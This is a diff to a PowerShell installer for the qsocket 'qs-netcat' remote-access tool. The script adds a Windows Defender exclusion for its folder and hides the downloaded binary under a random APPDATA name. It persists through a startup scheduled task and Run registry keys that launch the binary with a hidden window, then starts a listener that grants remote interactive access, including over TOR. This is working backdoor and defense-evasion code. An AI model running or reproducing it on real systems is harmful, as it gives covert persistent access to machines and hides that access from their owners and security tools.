@@ -2,7 +2,7 @@
 #
 # See https://qsocket.io/ for examples.
 # 
-# $env:DEBUG=1 for verbose output.
+# $env:DEBUG=1 # for verbose output.
 
 $GITHUB_REPO="https://api.github.com/repos/qsocket"
 $QS_UTIL="qs-netcat"
@@ -128,9 +128,9 @@ function Download-Qsocket-Util($path)
 function Create-Sceduled-Task($path, $secret)
 {
     Print-Debug "Creating scheduled task..."
-    Print-Debug "Task command: powershell.exe -WindowStyle Hidden -Command $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
+    Print-Debug "Task command: powershell.exe -WindowStyle Hidden -Command $path -liqs $secret"
     try {
-        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`""
+        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$path -liqs $secret`""
         $T = New-ScheduledTaskTrigger -AtStartup
         if(Is-Administrator){
             $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
@@ -152,10 +152,11 @@ function Create-Run-Key($path, $secret)
     try {
         if(Is-Administrator){
             Print-Debug "Running as administrator"
-            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`"" >$null
+            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path -liqs $secret`"" >$null
         }else{
             Print-Debug "Running as $env:UserName"
-            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`"" >$null
+            Print-Debug "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`""
+            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`"" >$null
         }
     }catch {
         Print-Debug $_.Exception
@@ -164,8 +165,10 @@ function Create-Run-Key($path, $secret)
     Print-Debug "Auto-run key added successfully"  
 }
 
-function Print-Usage
+function Print-Usage($secret_file)
 {
+    Write-Host " `n"
+    Get-Content $secret_file | & $QS_PATH "--qr"
     Write-Host " `n"
     Write-Host "# >>> Connect ============> qs-netcat -i -s $SECRET" -ForegroundColor Green
     Write-Host "# >>> Connect With TOR ===> qs-netcat -T -i -s $SECRET" -ForegroundColor Green
@@ -174,18 +177,18 @@ function Print-Usage
 
 
 Write-Host "$BANNER"
-$SECRET= -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
-# Print-Status "Secret: $SECRET"
+$SECRET=""
 $RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
-# Create QS_PATH
-$QS_PATH= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
-Print-Status "QSocket Path: $QS_PATH"
-mkdir $QS_PATH >$null
+$SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
+$QS_DIR= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
+$QS_PATH= Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_HIDDEN_NAME"
+Print-Status "QSocket Dir: $QS_PATH"
+mkdir $QS_DIR >$null
 
 if (Is-Administrator) {
     Print-Progress "Adding defender exclusion path"
     try {
-        Add-MpPreference -ExclusionPath "$QS_PATH" >$null
+        Add-MpPreference -ExclusionPath "$QS_DIR" >$null
         Print-Ok
     }catch {
         Print-Fail
@@ -195,7 +198,7 @@ if (Is-Administrator) {
 # Download the latest qsocket utility
 try {
     Print-Progress "Downloading binaries"
-    Download-Qsocket-Util(Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz")
+    Download-Qsocket-Util(Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
     Print-Ok  
 }catch {
     Print-Fail
@@ -205,7 +208,7 @@ try {
 # Extract TAR.GZ to QS_PATH
 try {
     Print-Progress "Unpacking binaries"
-    tar zx -C "$QS_PATH" -f (Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz") 2>$null
+    tar zx -C "$QS_DIR" -f (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz") 2>$null
     Print-Ok
 }catch{
     Print-Fail
@@ -214,11 +217,11 @@ try {
 
 try {
     Print-Progress "Copying binaries"
-    Remove-Item -Path (Join-Path -Path $QS_PATH -ChildPath "$RAND_NAME.tar.gz")
-    Rename-Item -Path (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_NAME") -NewName "$QS_BIN_HIDDEN_NAME"
-    if(! (Test-Path -Path (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") -PathType Leaf)){
+    Remove-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$RAND_NAME.tar.gz")
+    Rename-Item -Path (Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_NAME") -NewName "$QS_BIN_HIDDEN_NAME"
+    if(! (Test-Path -Path $QS_PATH -PathType Leaf)){
         Print-Fail
-        Print-Fatal "Move failed. ->  $QS_PATH\$QS_BIN_HIDDEN_NAME"
+        Print-Fatal "Move failed. ->  $QS_PATH"
     }
     Print-Ok
 }catch {
@@ -228,7 +231,17 @@ try {
 
 try {
     Print-Progress "Testing qsocket binaries"
-    # $SECRET = ((Start-Process -Wait (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-g" -NoNewWindow) | Out-String)
+    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+    $pinfo.FileName = $QS_PATH
+    $pinfo.RedirectStandardError = $true
+    $pinfo.UseShellExecute = $false
+    $pinfo.Arguments = "-g"
+    $proc = New-Object System.Diagnostics.Process
+    $proc.StartInfo = $pinfo
+    $proc.Start() | Out-Null
+    $proc.WaitForExit()
+    $SECRET = $proc.StandardError.ReadToEnd()
+    $SECRET | Out-File -FilePath "$SECRET_FILE"
     Print-Ok
 }catch{
     Print-Fail
@@ -255,10 +268,10 @@ try {
 
 try {
     Print-Progress "Starting qsocket utility"
-    Print-Debug (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME")
-    Start-Process (Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME") "-l -i -q -s $secret" -WindowStyle Hidden
+    Print-Debug ("Path: "+(Join-Path -Path $QS_PATH -ChildPath "$QS_BIN_HIDDEN_NAME"))
+    Start-Process $QS_PATH "-liqs $SECRET" -WindowStyle Hidden
     Print-Ok
 }catch{
     Print-Fail
 }
-Print-Usage
+Print-Usage($SECRET_FILE)
